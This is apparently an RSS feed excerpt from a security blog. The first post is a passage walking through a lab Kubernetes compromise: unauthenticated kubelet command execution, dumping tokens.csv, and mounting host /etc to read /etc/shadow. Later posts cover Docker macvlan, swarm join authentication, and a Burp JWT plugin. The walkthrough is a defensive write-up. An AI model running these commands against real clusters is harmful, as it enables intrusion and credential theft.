&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=whoami&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We get back the answer that every pentester likes to see which is &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; !&lt;/p&gt;

&lt;p&gt;So at this point, that’s pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.&lt;/p&gt;

&lt;p&gt;So the next step in the attack would be to take over the cluster, for which the easiest way is likely to be getting control of the API server, as that lets us create new containers amongst other things.&lt;/p&gt;

&lt;p&gt;if we do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ps -ef&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PID   USER     TIME   COMMAND
    1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;here we can see that it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kubernetes/pki/tokens.csv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;so then we can just cat out that file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=cat /etc/kubernetes/pki/tokens.csv&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;and we get the token which is the first field listed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can communicate directly with the Kubernetes API like so&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -X GET -H &quot;Authorization: Bearer d65ba5f070e714ab&quot; https://192.168.41.233
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;this gives us easier control of the cluster than we had from just running individual commands on it.&lt;/p&gt;

&lt;p&gt;We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
chmod +x kubectl
./kubectl config set-cluster test --server=https://192.168.41.233
./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From here, the next step it to look at getting access to the underlying nodes.  This can be achieved by mapping in a volume from the node to a container that we run.&lt;/p&gt;

&lt;p&gt;so if we create a file called test-pod.yml&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /test-pd
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      # directory location on host
      path: /etc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and start it up with &lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl create -f test-pod.yml&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;we can then run a command to cat out the /etc/shadow file of the underlying node&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./kubectl exec test-pd -c test-container cat /test-pd/shadow
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From there it’s just a bit of password cracking needed and we get shell access to the underlying node.&lt;/p&gt;

&lt;p&gt;So from that we can see that there’s definitely something to think about if you’re going to run a Kubernetes cluster in production, i.e. protect access to the kubectl API port…&lt;/p&gt;
</description>
				<pubDate>Sat, 08 Oct 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</link>
				<guid isPermaLink="true">/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</guid>
			</item>
		
			<item>
				<title>Docker 1.12 - Macvlan</title>
				<description>&lt;p&gt;Another new cool facet of the 1.12 release of Docker Engine is that Macvlan and Ipvlan support is leaving experimental and is available for all users.  So now instead of the rather convoluted procedure I mentioned &lt;a href=&quot;https://raesene.github.io/blog/2016/02/07/Exploration-in-Docker-bridging/&quot;&gt;last time I looked at this&lt;/a&gt; we can now simplify the setup of containers attached to the same network as the host, removing the need for NAT translation from the container network to the host network.&lt;/p&gt;

&lt;p&gt;An aside first is that it can get a little confusing with Docker’s naming as you may be thinking “hey I already have containers on the docker bridge isn’t that already like being connected to the host network?”.  Well as explained &lt;a href=&quot;http://hicu.be/docker-container-network-types&quot;&gt;here&lt;/a&gt; what docker calls “bridged” is really “NAT” and macvlan is what most people would think of as “bridged”!&lt;/p&gt;

&lt;p&gt;Anyway, the first step in getting a container online directly with the host interface is to create a new macvlan network&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker network create -d macvlan --subnet=192.168.41.0/24 --gateway=192.168.41.1 --ip-range=192.168.41.128/26 -o parent=ens33 testnet
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;So in this example our host network’s subnet is 192.168.41.0/24 and our gateway is just the default gateway for that network.  Where it gets a little interesting is that we need to specify an ip range that docker can use to hand out to containers that connect to this network.  At the moment there’s no supported way to get containers connecting to a macvlan network to use the host network’s DHCP server so you need to either specify an &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip-range &lt;/code&gt; with a range that’s available and doesn’t overlap with a DHCP scope on the host network or alternatively you can pass &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip &amp;lt;address&amp;gt;&lt;/code&gt; to the individual &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; commands that we use to create containers on this network.&lt;/p&gt;

&lt;p&gt;Once you’ve created the network it’s just a question of specifying the network to use in the docker run command, so something like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --network=testnet ubuntu:16.04 /bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;should give you a container, likely with an address of 192.168.41.128 in this case.&lt;/p&gt;

&lt;p&gt;A couple of other points worth noting about macvlan support.  You can only have one macvlan or ipvlan network setup on a Docker engine instance at the moment (although obviously you can have multiple containers connected to it), and from the macvlan network, you won’t be able to contact the IP address of the host system.&lt;/p&gt;

&lt;p&gt;For more reading on this topic there’s a great set of articles at hicu.be on &lt;a href=&quot;http://hicu.be/docker-networking-macvlan-bridge-mode-configuration&quot;&gt;macvlan networking&lt;/a&gt; and &lt;a href=&quot;http://hicu.be/bridge-vs-macvlan&quot;&gt;bridges vs macvlan&lt;/a&gt; amongst others.&lt;/p&gt;

</description>
				<pubDate>Sat, 23 Jul 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/07/23/Docker-MacVLAN/</link>
				<guid isPermaLink="true">/blog/2016/07/23/Docker-MacVLAN/</guid>
			</item>
		
			<item>
				<title>A couple of initial thoughts on Docker Swarm mode and 1.12</title>
				<description>&lt;p&gt;It’s Dockercon time of year again, and of course you know what that means… loads of cool new features coming to the Docker ecosystem.  I’ve been (enviously) watching all the action remotely on twitter and various blogs and one of the features that jumped out at me was the new swarm mode for Docker engine. The idea of providing very easy to use clustering features for containerization is of course very attractive, but there are possible security concerns, both with encryption of traffic amongst swarm nodes and authentication/authorisation for systems joining the cluster.&lt;/p&gt;

&lt;p&gt;All the demos from various blogs show the setup of the swarm being super-simple, with only a couple of commands needed to get going (for example &lt;a href=&quot;https://ordina-jworks.github.io/conference/2016/06/20/whats-new-in-docker-112.html&quot;&gt;this post&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;So I thought this was worth a bit of investigation to see what’s happening under the covers.  I set-up a couple of VMs and installed docker 1.12 rc2 on both.&lt;/p&gt;

&lt;h1 id=&quot;network-attack-surface&quot;&gt;Network Attack Surface&lt;/h1&gt;

&lt;p&gt;Starting with the master node, after installing docker engine but before running &lt;code class=&quot;highlighter-rouge&quot;&gt;docker swarm init&lt;/code&gt; there are no network connections belonging to the docker process as, by default it only listens on the unix socket. After initializing the swarm, we can see they look like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112manager:~$ sudo netstat -tunap
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.41.185:7946     0.0.0.0:*               LISTEN      1064/dockerd
tcp6       0      0 :::2377                 :::*                    LISTEN      1064/dockerd
tcp6       0      0 127.0.0.1:2377          127.0.0.1:58742         ESTABLISHED 1064/dockerd
udp        0      0 192.168.41.185:7946     0.0.0.0:*                           1064/dockerd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from that we can see that running the swarm command adds some services listening on 7946/TCP and UDP and 2377/TCP.  From &lt;a href=&quot;https://docs.docker.com/engine/swarm/swarm-tutorial/&quot;&gt;the documentation&lt;/a&gt; we can see that these are used for cluster management and node communications.  This is kind of interesting from a security standpoint as it means that we have a network attack surface to look at, which for vanilla docker engine we didn’t.&lt;/p&gt;

&lt;h1 id=&quot;lack-of-authentication&quot;&gt;(Lack) of Authentication&lt;/h1&gt;

&lt;p&gt;Possibly more interesting, is how authentication for swarm nodes is set-up by default.&lt;/p&gt;

&lt;p&gt;After we’ve got our swarm started, we can go to our worker node and just type &lt;code class=&quot;highlighter-rouge&quot;&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377&lt;/code&gt; and we’re joined to the swarm.  Indeed really easy.&lt;/p&gt;

&lt;p&gt;From this the more security minded amongst you will have noticed something…. We weren’t asked for any credentials when joining the swarm!  So by default, anyone running docker-engine on a network that can contact the master can join the swarm and be assigned workloads as part of the swarm.&lt;/p&gt;

&lt;p&gt;Whilst this is obviously a nice setup for ease of development, I’d strongly recommend changing the defaults here if you’re running this in production.  As expected from &lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/swarm_init/&quot;&gt;the documentation&lt;/a&gt; there are options which can be run at swarm creation time to improve this situation.&lt;/p&gt;

&lt;p&gt;Firstly the autoaccept policy of the swarm can be changed.  This determines whether a swarm will automatically add new nodes or whether a manager has to explicitly accept them.  We can change the auto-accept policy with a command to our existing swarm&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@docker112manager:/etc/systemd/network# docker swarm update --auto-accept none
Swarm updated.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After this if we try to join a node to a swarm we get this message&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377
Error response from daemon: Your node is in the process of joining the cluster but needs to be accepted by existing cluster member.
To accept this node into cluster run &quot;docker node accept epy504pa1vr9oe4p3fvsp6fp7&quot; in an existing cluster manager. Use &quot;docker info&quot; command to see the current Swarm status of your node.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The other option we have to improve the situation with regard to node authentication is to specify a secret required to joing the swarm.  To specify a secret you just add it to the init command or use swarm update. For example:-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112manager:~$ docker swarm init --secret loremipsum123
Swarm initialized: current node (0qkezlwlccd7wfuadshi77zsy) is now a manager.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and then if you try to join this swarm without specifying the secret, Docker will throw an error&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@docker112worker1:~$ docker swarm join 192.168.41.185:2377
Error response from daemon: rpc error: code = 3 desc = A valid secret token is necessary to join this cluster: invalid policy or secret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once you’re all setup with your secrets specified and your auto-accept policy set, you’re good to get started setting up services and deploying containers over the swarm.&lt;/p&gt;
</description>
				<pubDate>Sun, 19 Jun 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/06/19/Docker-Swarm/</link>
				<guid isPermaLink="true">/blog/2016/06/19/Docker-Swarm/</guid>
			</item>
		
			<item>
				<title>Burp Plugin for use with JWT Tokens</title>
				<description>&lt;p&gt;One of the things that you get used to after using &lt;a href=&quot;https://portswigger.net/&quot;&gt;Burp&lt;/a&gt; for a while is that if there’s any area that it doesn’t have native functionality for, it’s possible to use Extender to code up your own.  I had cause to do a bit of this recently and as with the previous time I looked at this (&lt;a href=&quot;https://raesene.github.io/blog/2015/01/15/burp-passive-scanner-plugins-with-jruby/&quot;&gt;for passive scanner checks&lt;/a&gt;) there were some gaps in the documentation for doing this with JRuby, so I thought I’d write it up.&lt;/p&gt;

&lt;p&gt;This time, I was looking to automate the process of getting a new JWT token as a session handling rule for an application that needed a new token with each request.  Burp has pretty good session handling rules, but AFAIK at the moment they don’t cover the scenario where you need to embed your value into an HTTP header (as you do with JWT tokens sometimes).&lt;/p&gt;

&lt;p&gt;To do this what I did was write some code that implemented the ISessionHandlingAction interface using JRuby.  It’s a pretty simple interface, just two methods, so it wasn’t too tricky to get working.&lt;/p&gt;

&lt;p&gt;The main action you need to look at is called &lt;code class=&quot;highlighter-rouge&quot;&gt;performAction&lt;/code&gt; which takes two parameters which represent the request to be modified and the results of any macros that have been run.  That second part is important as using a macro is how we’re going to get our token to inject into the request.&lt;/p&gt;

&lt;p&gt;So first we set a couple of variables with the information from our two input requests.  We use these later on to get information about the requests that we need to extract data from them&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#This analyses the request that we&#39;re going to modify&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;analyzeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#This gets the first response from a macro item... should work for the basic case&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_response_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;analyzeResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macroItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The next bit is to get the token out of our macro response.  the idea of this process is that we use a burp macro to replay a request which generates a new token and then we extract it and insert it into new requests, so we’ll need that token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Extract the JWT token from the macro response&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macroItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macro_response_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBodyOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;macro_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;macro_body_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytesToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;jwt_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macro_body_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jwt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Next up we need to ensure that any existing Authorization header is removed before we add our new one.  This code is a bit brittle at the moment as it doesn’t account for cases where you have other authorization headers you might want (e.g. an HTTP basic one) or cases where there are multiple headers to remove.&lt;/p&gt;

&lt;p&gt;One thing I found a little tricky in this, coming from a ruby background, was the handling of removing an element from the array.  If you were doing this in ruby you might use &lt;code class=&quot;highlighter-rouge&quot;&gt;delete!&lt;/code&gt; to remove the element, but it’s important to note that the getHeaders call doesn’t return a ruby array, it returns a Java ArrayList which has a different set of methods altogether.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Get the headers from our base request&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#we need a ref for the existing authorisation header if any to delete&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#So headers is an ArrayList so no ruby delete methods first iterate over and get our header&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/Authorization: JWT/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#then remove the header if it exists &lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_to_delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Then with our new JWT token in hand and any previous one removed we just add our token into the request and send it on its way&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Add in our new authorization header&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Authorization: JWT &#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#We need to get the body to add to our headers which is what the next three lines do&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;body_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBodyOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Now we can create our new message with the headers and body that we need&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;new_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@helpers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;buildHttpMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Lets just log something so we know it&#39;s doing something&lt;/span&gt;
&lt;span class=&quot;vi&quot;&gt;@stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Changed a message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Set our Request to be the modified version from our code.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;baseRequestResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once we’ve got this plugin working, we can add it to a session handling rule in Burp’s project options.  You set the action to be “run macro” and then in macro handling there’s an option to invoke your extension after running the macro.  If you’ve loaded the plugin into burp ok, your plugin name should be on the drop down and you can insert it to have it run.&lt;/p&gt;

&lt;p&gt;The final code is up on my &lt;a href=&quot;https://github.com/raesene/burp_sample_plugins/blob/master/test_header_injection.rb&quot;&gt;github&lt;/a&gt;.&lt;/p&gt;
</description>
				<pubDate>Sun, 19 Jun 2016 10:01:39 +0100</pubDate>
				<link>/blog/2016/06/19/Burp-Plugin-JWT-Tokens/</link>
				<guid isPermaLink="true">/blog/2016/06/19/Burp-Plugin-JWT-Tokens/</guid>
			</item>
		
			<item>
				<title>Presenting from a Docker Container</title>
				<description>&lt;p&gt;I’ve been presenting a bit recently on &lt;a href=&quot;http://www.docker.com&quot;&gt;docker&lt;/a&gt; and in an attempt to keep my presentation environment relatively simple, I decided to move off from using prezi which doesn’t have a linux client to something a bit more platform agnostic.&lt;/p&gt;

&lt;p&gt;After some looking around I settled on using &lt;a href=&quot;https://github.com/dploeger/jekyll-revealjs&quot;&gt;jekyll-revealjs&lt;/a&gt; which combines &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; publishing with the &lt;a href=&quot;http://lab.hakim.se/reveal-js/#/&quot;&gt;Reveal.JS&lt;/a&gt; HTML/JS presentation framework.&lt;/p&gt;

